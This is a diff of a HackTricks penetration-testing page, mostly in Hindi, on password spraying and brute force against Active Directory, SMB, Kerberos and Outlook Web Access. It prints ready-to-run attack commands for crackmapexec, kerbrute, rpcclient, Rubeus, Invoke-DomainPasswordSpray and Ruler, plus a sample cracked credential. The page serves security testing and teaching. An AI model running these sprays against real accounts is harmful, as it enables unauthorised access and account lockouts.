@@ -1,31 +1,32 @@
-# पासवर्ड स्प्रेइंग / ब्रूट फोर्स
+# Password Spraying / Brute Force
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-HackTricks का समर्थन करने के अन्य तरीके:
-
-* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
-* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
-* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
-* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
-* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## **पासवर्ड स्प्रेइंग**
+## **Password Spraying**
 
-जब आपने कई **वैध उपयोगकर्ता नाम** पाए हैं, तो आप प्रत्येक पाए गए उपयोगकर्ताओं के साथ सबसे **सामान्य पासवर्ड** (पर्यावरण की पासवर्ड नीति को ध्यान में रखें) की कोशिश कर सकते हैं।\
-**डिफ़ॉल्ट** रूप से **न्यूनतम पासवर्ड लंबाई** **7** है।
+एक बार जब आप कई **मान्य उपयोगकर्ता नाम** ढूंढ लेते हैं, तो आप प्रत्येक खोजे गए उपयोगकर्ता के साथ सबसे **सामान्य पासवर्ड** आजमा सकते हैं (पर्यावरण की पासवर्ड नीति को ध्यान में रखें)।\
+**डिफ़ॉल्ट** रूप से **न्यूनतम** **पासवर्ड** **लंबाई** **7** है।
 
 सामान्य उपयोगकर्ता नामों की सूचियाँ भी उपयोगी हो सकती हैं: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-ध्यान दें कि आप **कुछ गलत पासवर्ड की कोशिश करने पर कुछ खातों को लॉकआउट कर सकते हैं** (डिफ़ॉल्ट रूप से 10 से अधिक)।
+ध्यान दें कि यदि आप कई गलत पासवर्ड आजमाते हैं तो आप **कुछ खातों को लॉकआउट कर सकते हैं** (डिफ़ॉल्ट रूप से 10 से अधिक)।
 
-### पासवर्ड नीति प्राप्त करें
+### Get password policy
 
-यदि आपके पास कुछ उपयोगकर्ता क्रेडेंशियल्स या डोमेन उपयोगकर्ता के रूप में शैली हो तो आप **पासवर्ड नीति प्राप्त कर सकते हैं**:
+यदि आपके पास कुछ उपयोगकर्ता क्रेडेंशियल्स या एक डोमेन उपयोगकर्ता के रूप में एक शेल है, तो आप **पासवर्ड नीति प्राप्त कर सकते हैं**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -42,45 +43,45 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### लाभांवित करना लिनक्स से (या सभी से)
+### Linux से शोषण (या सभी)
 
-* **crackmapexec** का उपयोग:
+* **crackmapexec** का उपयोग करते हुए:
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
 # Local Auth Spray (once you found some local admin pass or hash)
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
-* [**kerbrute**](https://github.com/ropnop/kerbrute) (Go) का उपयोग करें
+* [**kerbrute**](https://github.com/ropnop/kerbrute) (Go) का उपयोग करना
 ```bash
 # Password Spraying
 ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-* [**स्प्रे**](https://github.com/Greenwolf/Spray) _**(आप लॉकआउट से बचने के लिए प्रयासों की संख्या दर्शा सकते हैं):**_
+* [**spray**](https://github.com/Greenwolf/Spray) _**(आप लॉकआउट से बचने के लिए प्रयासों की संख्या निर्दिष्ट कर सकते हैं):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-* [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) का उपयोग करें (python) - कभी-कभी काम नहीं करता है, इसलिए सिफारिश नहीं की जाती है
+* [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) का उपयोग करना - अनुशंसित नहीं है कभी-कभी काम नहीं करता
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-* **Metasploit** के `scanner/smb/smb_login` मॉड्यूल के साथ:
+* With the `scanner/smb/smb_login` module of **Metasploit**:
 
-![](<../../.gitbook/assets/image (132) (1).png>)
+![](<../../.gitbook/assets/image (745).png>)
 
-* **rpcclient** का उपयोग:
+* Using **rpcclient**:
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
 for u in $(cat users.txt); do
 rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
 done
 ```
-#### Windows से
+#### From Windows
 
-* [Rubeus](https://github.com/Zer1t0/Rubeus) के संस्करण के साथ ब्रूट मॉड्यूल के साथ:
+* [Rubeus](https://github.com/Zer1t0/Rubeus) के ब्रूट मॉड्यूल के साथ संस्करण:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -88,7 +89,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-* [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) के साथ (यह डिफ़ॉल्ट रूप से डोमेन से उपयोगकर्ताओं को उत्पन्न कर सकता है और यह डोमेन से पासवर्ड नीति प्राप्त करेगा और इसके अनुसार प्रयासों की सीमा निर्धारित करेगा):
+* [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) के साथ (यह डिफ़ॉल्ट रूप से डोमेन से उपयोगकर्ताओं को उत्पन्न कर सकता है और यह डोमेन से पासवर्ड नीति प्राप्त करेगा और इसके अनुसार प्रयासों को सीमित करेगा):
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
@@ -106,15 +107,15 @@ legba kerberos --target 127.0.0.1 --username admin --password wordlists/password
 
 ## Outlook Web Access
 
-आउटलुक के पासवर्ड स्प्रे करने के लिए कई टूल हैं।
+p**assword spraying outlook** के लिए कई उपकरण हैं।
 
 * [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/) के साथ
 * [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/) के साथ
-* [Ruler](https://github.com/sensepost/ruler) (विश्वसनीय!)
-* [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (पावरशेल)
-* [MailSniper](https://github.com/dafthack/MailSniper) (पावरशेल)
+* [Ruler](https://github.com/sensepost/ruler) के साथ (विश्वसनीय!)
+* [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) के साथ (Powershell)
+* [MailSniper](https://github.com/dafthack/MailSniper) के साथ (Powershell)
 
-इन टूल्स में से किसी का उपयोग करने के लिए, आपको एक उपयोगकर्ता सूची और एक पासवर्ड / स्प्रे करने के लिए एक छोटी सूची पासवर्ड की आवश्यकता है।
+इनमें से किसी भी उपकरण का उपयोग करने के लिए, आपको एक उपयोगकर्ता सूची और एक पासवर्ड / पासवर्ड की एक छोटी सूची की आवश्यकता है।
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -123,11 +124,11 @@ legba kerberos --target 127.0.0.1 --username admin --password wordlists/password
 [x] Failed: c.cube:Summer2020
 [+] Success: s.svensson:Summer2020
 ```
-## गूगल
+## Google
 
 * [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
 
-## ओक्टा
+## Okta
 
 * [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
 * [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
@@ -137,19 +138,20 @@ legba kerberos --target 127.0.0.1 --username admin --password wordlists/password
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
 * [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
-* [www.blackhillsinfosec.com/?p=5296](www.blackhillsinfosec.com/?p=5296)
+* [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 * [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-HackTricks का समर्थन करने के अन्य तरीके:
-
-* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
-* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
-* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
-* **जुड़ें** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर **फॉलो** करें।
-* **हैकिंग ट्रिक्स साझा करें** हैकट्रिक्स और हैकट्रिक्स क्लाउड गिटहब रेपो में **पीआर जमा करके**।
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
